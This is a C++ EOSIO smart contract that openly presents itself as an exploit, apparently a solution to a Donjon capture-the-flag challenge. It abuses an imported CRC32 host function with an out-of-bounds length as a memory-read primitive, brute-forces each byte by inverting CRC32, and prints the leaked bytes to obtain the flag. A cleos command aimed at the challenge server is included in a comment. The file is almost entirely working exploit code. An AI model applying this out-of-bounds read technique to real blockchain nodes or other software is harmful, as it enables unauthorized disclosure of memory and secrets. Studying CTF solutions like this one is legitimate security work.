#include <eosio/eosio.hpp>
#include <eosio/crypto.hpp>

using namespace eosio;
extern "C" {
	__attribute__((eosio_wasm_import))
	uint32_t crc32( const char* data, uint32_t value, uint32_t datalen);
}

/*
 * Ugly way to find a byte value using CRC32.
 */
uint8_t find_byte(uint32_t p_cs, uint32_t c_cs, int min, int max)
{
	for (int i = min; i < max; i++) {
		uint32_t value = (~p_cs) ^ i;
		for (unsigned int bitpos = 0; bitpos < 8; bitpos ++) {
			value = (value >> 1) ^ (0xEDB88320 & -(value & 1));
		}

		if (~value == c_cs)
			return i;
	}

	return 0xff;
}

/*
 * Use our CRC32 capabability as an read primitive.
 */
uint8_t *crc32_read(
		const void *addr,
		size_t offset,
		size_t len,
		uint32_t value)
{
	uint32_t p_cs = value, c_cs = 0;
	uint8_t *buf = NULL;

	buf = (uint8_t*)calloc(1, len);
	if (!buf) {
		return NULL;
	}

	for (int i = offset; i < offset + len; i++) {
		c_cs = crc32((const char*)addr, value, (uint32_t)(i + 1));

		uint8_t b = find_byte(p_cs, c_cs, 0, 256);
		buf[i] = b;
		p_cs = c_cs;
	}

	return buf;
}

/*
 * To query the contract:
 * $ cleos -u http://modern-cryptocomputer.donjon-ctf.io:30510 push action zone get_flag '[0x10000, 0x0, 0x40]' -p zone@active
 */
class [[eosio::contract]] exploit : public contract {
	public:
	using contract::contract;

	[[eosio::action]]
	void get_flag( uint32_t addr, uint32_t off, uint32_t len ) {
                /*
                 * Exploit our out-of-bound CRC32 computation to get an
                 * out-of-bound read and get the flag.
                 */
		uint8_t *dst_buffer = NULL;
		dst_buffer = crc32_read((void*)addr, off, len, 0x0);
                if (dst_buffer)
                    printhex(dst_buffer, len);
	}
};
